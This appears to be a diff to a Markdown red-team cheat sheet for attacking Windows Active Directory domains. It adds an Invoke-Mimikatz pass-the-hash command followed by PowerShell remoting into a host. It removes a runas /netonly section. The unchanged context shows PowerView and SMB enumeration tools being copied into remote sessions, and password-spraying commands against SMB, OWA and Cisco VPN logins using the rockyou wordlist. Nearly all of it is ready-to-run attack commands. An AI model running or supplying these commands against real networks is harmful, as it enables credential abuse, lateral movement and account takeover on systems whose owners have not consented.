@@ -47,8 +47,12 @@ Copy-Item -Path C:\Users\NyaMeeEain\Desktop\Tools\Invoke-SMBEnum.ps1 -Destinatio
 Copy-Item -Path C:\Users\NyaMeeEain\Desktop\Tools\powerview-dev.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 3)
 ```
 
-
-
+### Mimikatz Spawning 
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:John /domain:insomnia.io /ntlm:<> /run:powershell.exe"'
+$Session = New-PSSession -ComputerName John.Insomnia
+Enter-PSSession $Session
+```
 
 ### PowerShell Remoting 
 ```
@@ -74,11 +78,5 @@ spray.sh -smb 192.168.1.100 users.txt /usr/share/wordlists/rockyou.txt  1 35 ins
 spray.sh -owa 192.168.1.100 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA
 spray.sh -cisco 192.168.1.100 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN
 python atomizer.py owa insomnia.io '123456@' emails.txt
-```
-### Runas
-```
-runas /netonly /user:nyameeeain "C:\Windows\System32\calc.exe"
-runas /netonly /user:nyameeeain powershell
-runas /netonly /user:insomnia\nyameeeain "C:\Windows\System32\calc.exe"
 ```
 
